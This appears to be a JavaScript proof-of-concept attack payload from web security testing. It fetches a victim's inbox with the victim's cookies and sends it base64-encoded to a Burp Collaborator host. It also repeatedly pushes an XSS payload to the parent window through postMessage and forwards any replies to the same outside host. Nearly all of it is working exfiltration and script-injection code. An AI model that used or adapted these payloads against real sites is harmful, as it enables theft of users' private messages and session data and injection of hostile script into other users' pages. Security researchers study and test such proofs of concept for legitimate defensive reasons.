// Steal inbox/messages (adjust endpoint to something valid on target)
fetch("/messages/c0a634866745", { credentials: "include" })
  .then(r => r.text())
  .then(t => {
    fetch("https://907kocpfvd3dgpex2ok446r9e0kq8f.burpcollaborator.net/inbox?d=" + btoa(t));
  });

// =========================
// NET POC: postMessage Escalation Test
// =========================

// Send a simple probe to the parent
setInterval(() => {
  window.parent.postMessage("NET_POC_TEST", "*");
}, 2000);

// Try sending a script injection payload
setInterval(() => {
  window.parent.postMessage('<img src=x onerror=alert("NET POC XSS via postMessage")>', "*");
}, 5000);

// Listen for responses (if the parent replies back)
window.addEventListener("message", (event) => {
  // Log what the parent sends back
  fetch("https://907kocpfvd3dgpex2ok446r9e0kq8f.burpcollaborator.net/pm?resp=" + encodeURIComponent(event.data));
});
